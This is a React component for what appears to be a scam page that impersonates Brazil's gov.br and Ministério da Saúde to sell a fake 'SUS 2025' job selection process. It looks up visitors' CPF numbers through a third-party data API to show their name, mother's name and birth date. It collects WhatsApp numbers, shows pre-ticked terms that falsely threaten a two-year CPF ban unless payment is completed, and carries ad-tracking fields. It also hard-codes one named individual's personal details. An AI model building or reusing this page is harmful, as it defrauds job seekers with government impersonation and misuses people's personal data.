import React, { useState, useEffect } from 'react';
import { 
  ArrowLeft, 
  Heart, 
  FileText, 
  Calendar, 
  MapPin, 
  Clock, 
  AlertCircle,
  User,
  Briefcase,
  QrCode,
  Save,
  Telescope,
  CheckCircle
} from 'lucide-react';

interface CpfData {
  cpf: string;
  nome: string;
  mae: string;
  nascimento: string;
  sexo: string;
}

interface ReceiptPageProps {
  selectedJob: {
    id: string;
    title: string;
    salary: string;
  } | null;
  cepData: {
    cep: string;
    logradouro: string;
    bairro: string;
    localidade: string;
    uf: string;
    ibge: string;
  } | null;
  cpfData: string;
  onContinueToPayment: () => void;
}

const ReceiptPage: React.FC<ReceiptPageProps> = ({ selectedJob, cepData, cpfData, onContinueToPayment }) => {
  const [telefone, setTelefone] = useState('');
  const [telefoneSalvo, setTelefoneSalvo] = useState(false);
  const [userCpfData, setUserCpfData] = useState<CpfData | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Microsoft Clarity Script
    const clarityScript = document.createElement('script');
    clarityScript.type = 'text/javascript';
    clarityScript.innerHTML = `
      (function(c,l,a,r,i,t,y){
        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
      })(window, document, "clarity", "script", "s7etjgu6fe");
    `;
    document.head.appendChild(clarityScript);

    // UTMify Scripts
    const utmifyScript1 = document.createElement('script');
    utmifyScript1.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    utmifyScript1.setAttribute('data-utmify-prevent-xcod-sck', '');
    utmifyScript1.setAttribute('data-utmify-prevent-subids', '');
    utmifyScript1.async = true;
    utmifyScript1.defer = true;
    document.head.appendChild(utmifyScript1);

    const utmifyScript2 = document.createElement('script');
    utmifyScript2.innerHTML = `
      window.pixelId = "68621dc299ff164a9cb8777f";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    `;
    document.head.appendChild(utmifyScript2);

    // Check if phone is already saved in localStorage
    const storedPhone = localStorage.getItem('userPhone');
    if (storedPhone) {
      setTelefone(storedPhone);
      setTelefoneSalvo(true);
    }

    // Cleanup function to remove scripts when component unmounts
    return () => {
      document.head.removeChild(clarityScript);
      document.head.removeChild(utmifyScript1);
      document.head.removeChild(utmifyScript2);
    };
  }, []);

  useEffect(() => {
    const fetchUserData = async () => {
      if (cpfData) {
        setIsLoading(true);
        try {
          const cleanCpf = cpfData.replace(/\D/g, '');
          const response = await fetch(`https://apela-api.tech/?user=b1b0e7e6-3bd8-4aae-bcb0-2c03940c3ae9&cpf=${cleanCpf}`);
          const data = await response.json();
          
          if (data.status === 200 && data.nome) {
            const formattedData = {
              cpf: data.cpf || cpfData,
              nome: data.nome,
              mae: data.mae || 'Não informado',
              nascimento: data.nascimento,
              sexo: data.sexo
            };
            setUserCpfData(formattedData);
          }
        } catch (error) {
          console.error('Erro ao buscar dados do CPF:', error);
        } finally {
          setIsLoading(false);
        }
      }
    };

    fetchUserData();
  }, [cpfData]);

  const handleBack = () => {
    window.history.back();
  };

  const handleTelefoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
      value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    }
    setTelefone(value);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (telefone && telefone.length >= 14) {
      setTelefoneSalvo(true);
      // Save phone to localStorage
      localStorage.setItem('userPhone', telefone);
    }
  };

  const handleFinalizeInscricao = () => {
    onContinueToPayment();
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return '';
    // A data já vem formatada da API (DD/MM/YYYY)
    return dateString;
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      {/* Header */}
      <header className="bg-white shadow-sm relative">
        <div className="flex justify-between items-center px-4 py-3 border-b border-gray-200">
          <div className="flex items-center">
            <button className="flex items-center hover:opacity-80 transition-opacity bg-transparent border-none p-0">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
                alt="gov.br" 
                className="h-8"
              />
            </button>
          </div>
          
          <div className="flex items-center space-x-4">
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Menu">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="12" cy="12" r="1"></circle>
                <circle cx="12" cy="5" r="1"></circle>
                <circle cx="12" cy="19" r="1"></circle>
              </svg>
            </button>
            <div className="w-px h-6 bg-blue-900"></div>
            <button 
              className="text-blue-900 hover:text-blue-700 transition-colors" 
              aria-label="Acessibilidade" 
              title="Alternar modo de alto contraste"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="13.5" cy="6.5" r=".5" fill="currentColor"></circle>
                <circle cx="17.5" cy="10.5" r=".5" fill="currentColor"></circle>
                <circle cx="8.5" cy="7.5" r=".5" fill="currentColor"></circle>
                <circle cx="6.5" cy="12.5" r=".5" fill="currentColor"></circle>
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"></path>
              </svg>
            </button>
           
            <button className="text-blue-900 hover:text-blue-700 transition-colors relative" aria-label="Aplicativos">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <rect width="18" height="18" x="3" y="3" rx="2"></rect>
                <path d="M3 9h18"></path>
                <path d="M3 15h18"></path>
                <path d="M9 3v18"></path>
                <path d="M15 3v18"></path>
              </svg>
            </button>
            <button className="bg-blue-700 text-white px-4 py-2 rounded-full flex items-center hover:bg-blue-800 transition-colors text-sm font-medium border-none">
             Login
            </button>
          </div>
        </div>
        
        <div className="flex justify-between items-center px-4 py-2 bg-gray-50">
          <div className="flex items-center">
            <button className="text-blue-900 hover:text-blue-700 transition-colors mr-3" aria-label="Menu lateral">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <line x1="4" x2="20" y1="12" y2="12"></line>
                <line x1="4" x2="20" y1="6" y2="6"></line>
                <line x1="4" x2="20" y1="18" y2="18"></line>
              </svg>
            </button>
            <span className="text-gray-800 text-sm font-medium">Ministério da Saúde</span>
          </div>
          
          <div className="flex items-center space-x-3">
            <button 
              className="text-blue-900 hover:text-blue-700 transition-colors" 
              aria-label="Busca por voz" 
              title="Busca por voz"
            >
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"></path>
                <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
                <line x1="12" x2="12" y1="19" y2="22"></line>
              </svg>
            </button>
            <button className="text-blue-900 hover:text-blue-700 transition-colors" aria-label="Pesquisar">
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-5 h-5">
                <circle cx="11" cy="11" r="8"></circle>
                <path d="m21 21-4.3-4.3"></path>
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}
      <nav className="bg-white border-b border-gray-200 px-4 py-3" aria-label="Navegação estrutural">
        <div className="flex flex-wrap items-center gap-1 text-sm">
          <button 
            onClick={handleBack}
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs flex items-center bg-transparent border-none p-0"
          >
            <ArrowLeft className="w-3 h-3" />
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <button 
            onClick={handleBack}
            className="text-blue-700 hover:text-blue-800 transition-colors text-xs bg-transparent border-none p-0"
          >
            Validação de Identidade
          </button>
          <span className="mx-1 text-gray-600">{'>'}</span>
          <span className="text-gray-800 text-xs font-medium">Comprovante</span>
        </div>
      </nav>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <h1 className="text-3xl font-semibold mb-4 text-green-800">Comprovante de Inscrição</h1>
        
        <div className="border-t border-b border-gray-300 py-3 mb-6">
          <div className="text-gray-700 text-sm">
            <p>Gerado em 29/06/2025, 19:51</p>
          </div>
        </div>

        {/* Informações do Processo Seletivo */}
        <div className="bg-gradient-to-r from-green-50 to-blue-50 border border-green-200 rounded-lg p-6 mb-6">
          <h2 className="text-xl font-semibold text-green-800 mb-4 flex items-center">
            <Heart className="w-6 h-6 mr-2" />
            Informações do Processo Seletivo - SUS 2025
          </h2>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="space-y-4">
              {/* Formato da Prova */}
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <h3 className="font-semibold text-green-800 mb-3 flex items-center">
                  <FileText className="w-5 h-5 mr-2" />
                  Formato da Prova
                </h3>
                <div className="space-y-2 text-sm text-green-700">
                  <div className="flex items-center">
                    <span className="w-2 h-2 bg-green-600 rounded-full mr-3"></span>
                    <strong>60 questões objetivas</strong>
                  </div>
                  <div className="flex items-center">
                    <span className="w-2 h-2 bg-blue-600 rounded-full mr-3"></span>
                    <strong>Prova prática</strong>
                  </div>
                  <div className="flex items-center">
                    <span className="w-2 h-2 bg-purple-600 rounded-full mr-3"></span>
                    <strong>Múltipla escolha</strong>
                  </div>
                </div>
              </div>

              {/* Data e Horário */}
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <h3 className="font-semibold text-green-800 mb-3 flex items-center">
                  <Calendar className="w-5 h-5 mr-2" />
                  Data e Horário
                </h3>
                <div className="space-y-2 text-sm text-green-700">
                  <div>
                    <span className="font-medium">Data:</span>
                    <p className="text-lg font-bold text-green-800">15 de Setembro de 2025</p>
                  </div>
                  <div>
                    <span className="font-medium">Horário:</span>
                    <p className="text-lg font-bold text-green-800">14h às 18h</p>
                  </div>
                  <div>
                    <span className="font-medium">Duração:</span>
                    <p className="font-semibold text-blue-700">4 horas</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              {/* Local da Prova */}
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <h3 className="font-semibold text-green-800 mb-3 flex items-center">
                  <MapPin className="w-5 h-5 mr-2" />
                  Local da Prova
                </h3>
                <div className="space-y-2 text-sm text-green-700">
                  <p className="font-medium">
                    <strong>Unidade de Saúde mais próxima da sua residência</strong>
                  </p>
                  <div className="bg-green-50 p-3 rounded border border-green-200">
                    <p className="text-xs text-green-600">
                      🏥 O local exato será informado no cartão de confirmação, enviado por email após a confirmação da inscrição.
                    </p>
                  </div>
                </div>
              </div>

              {/* Cronograma */}
              <div className="bg-white p-4 rounded-lg border border-green-200">
                <h3 className="font-semibold text-green-800 mb-3 flex items-center">
                  <Clock className="w-5 h-5 mr-2" />
                  Cronograma Importante
                </h3>
                <div className="space-y-2 text-sm text-green-700">
                  <div className="flex justify-between">
                    <span>Inscrições:</span>
                    <span className="font-medium">Abertas</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Cartão de confirmação:</span>
                    <span className="font-medium">01/09/2025</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Prova objetiva:</span>
                    <span className="font-medium text-green-800">15/09/2025</span>
                  </div>
                  <div className="flex justify-between">
                    <span>Resultado:</span>
                    <span className="font-medium">30/09/2025</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Aviso Importante */}
          <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
            <div className="flex items-start">
              <AlertCircle className="w-5 h-5 text-yellow-600 mr-2 mt-0.5" />
              <div className="text-sm text-yellow-800">
                <p className="font-semibold mb-1">⚠️ Importante:</p>
                <ul className="list-disc list-inside space-y-1">
                  <li>Chegue ao local com <strong>1 hora de antecedência</strong></li>
                  <li>Leve documento oficial com foto</li>
                  <li>Caneta esferográfica azul ou preta</li>
                  <li>O cartão de confirmação será enviado por email</li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        {/* Progress Bar */}
        <div className="bg-white border border-gray-200 rounded-lg p-4 md:p-6 mb-6 md:mb-8">
          <h2 className="text-base md:text-lg font-semibold text-gray-800 mb-3 md:mb-4">Progresso da Inscrição</h2>
          
          {/* Desktop Progress */}
          <div className="hidden md:flex items-center justify-between">
            <div className="flex items-center">
              <div className="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">✓</div>
              <span className="ml-2 text-sm font-medium text-green-600">Dados Pessoais</span>
            </div>
            <div className="flex-1 mx-3 h-1 bg-green-600 rounded"></div>
            <div className="flex items-center">
              <div className="w-7 h-7 bg-green-600 text-white rounded-full flex items-center justify-center text-xs font-medium">2</div>
              <span className="ml-2 text-sm font-medium text-green-600">Documentação</span>
            </div>
            <div className="flex-1 mx-3 h-1 bg-gray-200 rounded">
              <div className="h-1 bg-green-600 rounded transition-all duration-500" style={{ width: '50%' }}></div>
            </div>
            <div className="flex items-center">
              <div className="w-7 h-7 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-xs font-medium">3</div>
              <span className="ml-2 text-sm text-gray-600">Finalização</span>
            </div>
          </div>

          {/* Mobile Progress */}
          <div className="md:hidden">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs text-gray-600">Etapa 2 de 3</span>
              <span className="text-xs font-medium text-green-600">66% concluído</span>
            </div>
            <div className="w-full bg-gray-200 rounded-full h-2 mb-3">
              <div className="bg-green-600 h-2 rounded-full" style={{ width: '66%' }}></div>
            </div>
            <div className="flex justify-between text-xs">
              <span className="font-medium text-green-600">• Dados Pessoais</span>
              <span className="font-medium text-green-600">• Documentação</span>
              <span className="text-gray-500">Finalização</span>
            </div>
          </div>
        </div>

        {/* Comprovante */}
        <div className="bg-white border-2 border-green-500 rounded-lg p-6 mb-8 shadow-lg">
          <div className="text-center mb-6">
            <div className="flex items-center justify-center mb-4">
              <div>
                <h2 className="text-xl font-bold text-gray-800">GOVERNO FEDERAL</h2>
                <p className="text-sm text-gray-600">Ministério da Saúde</p>
              </div>
            </div>
            <h3 className="text-lg font-semibold text-green-700 mb-2">COMPROVANTE DE PRÉ-INSCRIÇÃO</h3>
            <p className="text-sm text-gray-600">Sistema Único de Saúde (SUS)</p>
          </div>

          <div className="border-t border-b border-gray-200 py-4 mb-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <span className="text-sm font-medium text-gray-600">Protocolo:</span>
                <p className="font-mono text-lg font-bold text-green-600">SUS-2025-101105</p>
              </div>
              <div>
                <span className="text-sm font-medium text-gray-600">Status:</span>
                <p className="font-medium text-green-600">PRÉ-INSCRIÇÃO PENDENTE DE PAGAMENTO</p>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <h4 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                <User className="w-5 h-5 mr-2 text-green-600" />
                Dados Pessoais
              </h4>
              {isLoading ? (
                <div className="text-center py-4">
                  <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-green-600 mx-auto mb-2"></div>
                  <p className="text-gray-600 text-sm">Carregando dados...</p>
                </div>
              ) : userCpfData ? (
                <div className="space-y-3">
                  <div>
                    <span className="text-sm font-medium text-gray-600">Nome Completo:</span>
                    <p className="font-medium text-gray-700">{userCpfData.nome}</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">CPF:</span>
                    <p className="font-medium font-mono text-gray-700">{cpfData}</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">Data de Nascimento:</span>
                    <p className="font-medium text-gray-700">{formatDate(userCpfData.nascimento)}</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">Nome da Mãe:</span>
                    <p className="font-medium text-gray-700">{userCpfData.mae}</p>
                  </div>
                </div>
              ) : (
                <div className="space-y-3">
                  <div>
                    <span className="text-sm font-medium text-gray-600">Nome Completo:</span>
                    <p className="font-medium text-gray-700">Rizia Regia Da Silva Rodrigues Magalhaes</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">CPF:</span>
                    <p className="font-medium font-mono text-gray-700">{cpfData || '011.011.011-05'}</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">Data de Nascimento:</span>
                    <p className="font-medium text-gray-700">17/07/1984</p>
                  </div>
                  <div>
                    <span className="text-sm font-medium text-gray-600">Nome da Mãe:</span>
                    <p className="font-medium text-gray-700">Maria Bezerra Da Silva Rodrigues</p>
                  </div>
                </div>
              )}
            </div>

            <div>
              <h4 className="text-lg font-semibold text-gray-800 mb-4 flex items-center">
                <Briefcase className="w-5 h-5 mr-2 text-green-600" />
                Dados da Vaga
              </h4>
              <div className="space-y-3">
                <div>
                  <span className="text-sm font-medium text-gray-600">Cargo Pretendido:</span>
                  <p className="font-medium text-gray-700">{selectedJob?.title || 'Técnico em Farmácia'}</p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-600">Localização:</span>
                  <p className="font-medium text-gray-700">
                    {cepData ? `${cepData.localidade}/${cepData.uf}` : 'Rio de Janeiro/RJ'}
                  </p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-600">Remuneração:</span>
                  <p className="font-medium text-green-600">{selectedJob?.salary || 'R$ 4.700,00 - R$ 6.600,00'}</p>
                </div>
              </div>
            </div>
          </div>

          <div className="mt-6 pt-6 border-t border-gray-200 text-center">
            <div className="flex items-center justify-center mb-4">
              <div className="bg-gray-100 w-24 h-24 rounded-lg flex items-center justify-center mr-4">
                <QrCode className="w-12 h-12 text-gray-400" />
              </div>
              <div className="text-left">
                <p className="text-sm font-medium text-gray-700">Código de Validação:</p>
                <p className="font-mono text-lg font-bold text-green-600">SUS-2025-101105</p>
                <p className="text-xs text-gray-500 mt-1">Utilize este código para consultar o status da sua inscrição</p>
              </div>
            </div>
          </div>
        </div>

        {/* Confirmar Telefone */}
        <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-8">
          <h3 className="text-lg font-semibold text-green-800 mb-4 flex items-center">
            <Telescope className="w-5 h-5 mr-2" />
            Confirmar Telefone de Contato
          </h3>
          <p className="text-green-700 mb-4 text-sm">
            Por favor, confirme ou informe seu telefone para contato. Ele será usado para todas as comunicações sobre sua inscrição.
          </p>
          
          {!telefoneSalvo ? (
            <form className="space-y-4" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="telefone-comprovante" className="block text-sm font-medium text-gray-700 mb-2">
                  Telefone para contato (WhatsApp): <span className="text-red-600">*</span>
                </label>
                <input
                  type="tel"
                  id="telefone-comprovante"
                  placeholder="(00) 00000-0000"
                  required
                  inputMode="numeric"
                  maxLength={15}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-green-500 focus:border-green-500"
                  value={telefone}
                  onChange={handleTelefoneChange}
                  style={{ fontSize: '16px' }}
                />
              </div>
              
              <button
                type="submit"
                disabled={!telefone || telefone.length < 14}
                className="w-full font-medium py-3 px-6 rounded-md transition-colors bg-green-600 hover:bg-green-700 text-white disabled:bg-gray-400 disabled:cursor-not-allowed"
              >
                <Save className="w-4 h-4 mr-2 inline" />
                Salvar Telefone de Contato
              </button>

              {/* Hidden UTM Fields */}
              <input type="hidden" name="utm_source" value="FBjLj6861a6742fcf2e7936e43ecb" />
              <input type="hidden" name="utm_campaign" value="%5BSUSEP02%5D %5BCT11%5D %5BDIA25%5D — Cópia%7C120226602347950406" />
              <input type="hidden" name="utm_medium" value="Novo conjunto de anúncios de Vendas — Cópia%7C120226602347990406" />
              <input type="hidden" name="utm_content" value="AD11%7C120226602347970406" />
              <input type="hidden" name="utm_term" value="Instagram_Feed" />
              <input type="hidden" name="fbclid" value="PAQ0xDSwLKhMRleHRuA2FlbQEwAGFkaWQBqyF1OVb0tgGnz2dwvftj5WXnjbE1Vfn6BUYDN0IudKlzmKFuUlgSTlbYO2QfA5F94BbBfuk_aem_kgEcU7RLNH0fBnaTOTIjSQ" />
              <input type="hidden" name="utm_id" value="120226602347950406" />
            </form>
          ) : (
            <div className="text-center p-4 mt-4 rounded-md bg-green-50 border border-green-200">
              <p className="text-green-700 font-medium mb-2">
                <CheckCircle className="w-4 h-4 mr-2 inline" />
                Telefone de contato salvo com sucesso!
              </p>
              <div className="text-sm text-gray-700 space-y-1">
                <p><strong>Telefone:</strong> {telefone}</p>
                <p><strong>Salvo em:</strong> 29/06/2025, 19:56</p>
              </div>
            </div>
          )}
        </div>

        {/* Seção de Termos Obrigatórios - Só aparece após telefone salvo */}
        {telefoneSalvo && (
          <div id="secao-termos-obrigatorios" className="bg-green-50 border border-green-200 rounded-lg p-6 mt-6">
            <h3 className="text-lg font-semibold text-green-800 mb-4 flex items-center">
              <CheckCircle className="w-5 h-5 mr-2" />
              Termos da Inscrição - Aceitos Automaticamente
            </h3>
            
            <div className="space-y-4 mb-6">
              <div className="flex items-start">
                <input 
                  type="checkbox" 
                  id="termo-1" 
                  className="mt-1 mr-3 h-4 w-4 text-green-600 border-green-300 rounded focus:ring-green-500" 
                  checked 
                  readOnly
                />
                <label htmlFor="termo-1" className="text-sm text-green-700 cursor-pointer">
                  <strong>Estou ciente de que o não comparecimento à seleção</strong> impossibilitará minha participação em futuras provas ou concursos, podendo resultar em multas e taxas de cancelamento conforme regulamento oficial.
                </label>
              </div>
              
              <div className="flex items-start">
                <input 
                  type="checkbox" 
                  id="termo-2" 
                  className="mt-1 mr-3 h-4 w-4 text-green-600 border-green-300 rounded focus:ring-green-500" 
                  checked 
                  readOnly
                />
                <label htmlFor="termo-2" className="text-sm text-green-700 cursor-pointer">
                  <strong>Concordo com o pagamento obrigatório da taxa de inscrição</strong> no valor determinado pelo edital, entendendo que é requisito indispensável para validação da minha participação no programa.
                </label>
              </div>
              
              <div className="flex items-start bg-red-50 border border-red-200 rounded-lg p-3">
                <input 
                  type="checkbox" 
                  id="termo-3" 
                  className="mt-1 mr-3 h-4 w-4 text-red-600 border-red-300 rounded focus:ring-red-500" 
                  checked 
                  readOnly
                />
                <label htmlFor="termo-3" className="text-sm text-red-700 cursor-pointer">
                  <strong className="text-red-800">⚠️ IMPORTANTE:</strong> <strong>Estou ciente de que realizar a emissão do pagamento e não concluir deixará meu CPF Inapto durante 2 anos para participação em qualquer concurso público/federal.</strong>
                </label>
              </div>
            </div>
            
            <div className="text-center">
              <p className="text-sm text-gray-600 mb-4">
                Telefone cadastrado para comunicações: <strong className="text-green-600">{telefone}</strong>
              </p>
              <button 
                onClick={handleFinalizeInscricao}
                className="font-medium py-3 px-8 rounded-md transition-colors bg-green-600 hover:bg-green-700 text-white disabled:bg-gray-400 disabled:cursor-not-allowed"
              >
                <CheckCircle className="w-4 h-4 mr-2 inline" />
                Finalizar Inscrição e Ir para Pagamento
              </button>
            </div>
          </div>
        )}

        {/* Informações Importantes */}
        <div className="bg-green-50 border border-green-200 rounded-lg p-6 mt-8">
          <h3 className="text-lg font-semibold text-green-800 mb-3">Informações Importantes</h3>
          <div className="text-green-700 text-sm space-y-2">
            <p>• Guarde este comprovante para consultas futuras.</p>
            <p>• O processo seletivo seguirá as etapas previstas no edital oficial.</p>
            <p>• Acompanhe as comunicações através do seu telefone cadastrado.</p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-slate-900 text-white">
        <div className="container mx-auto px-6 py-8">
          <div className="py-6">
            <a 
              href="https://www.gov.br"
              target="_blank"
              rel="noopener noreferrer"
              className="inline-block hover:opacity-80 transition-opacity"
            >
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png"
                alt="Government of Brazil logo"
                className="w-40 brightness-0 invert"
              />
            </a>
          </div>

          <div className="border-t border-gray-600"></div>

          <nav aria-label="Menu principal do rodapé" className="mt-6">
            <ul>
              <li className="">
                <div className="py-3">
                  <div className="flex justify-between items-center">
                    <a
                      href="https://www.gov.br/sus/pt-br"
                      className="text-sm hover:text-gray-300 transition-colors flex items-center"
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      SUS
                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-3 h-3 ml-1">
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14 21 3"></path>
                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
                      </svg>
                    </a>
                  </div>
                </div>
              </li>
            </ul>
          </nav>

          <div className="mt-8 pt-6 border-t border-gray-600">
            <div className="grid md:grid-cols-2 gap-4 text-xs text-gray-400">
              <div>
                <p className="mb-2">
                  <strong>Ministério da Educação</strong><br />
                  Esplanada dos Ministérios, Bloco L<br />
                  CEP: 70047-900 - Brasília/DF
                </p>
                <p>
                  <strong>Central de Atendimento:</strong>{' '}
                  <a href="tel:08007616161" className="hover:text-white transition-colors">
                    0800 761 6161
                  </a>
                </p>
              </div>
              <div className="text-right">
                <p className="mb-2">
                  <a
                    href="https://www.gov.br/pt-br/termos-de-uso"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Termos de Uso
                  </a>{' '}
                  |{' '}
                  <a
                    href="https://www.gov.br/pt-br/politica-de-privacidade"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="hover:text-white transition-colors"
                  >
                    Política de Privacidade
                  </a>
                </p>
                <p>© 2025 Governo Federal do Brasil</p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default ReceiptPage;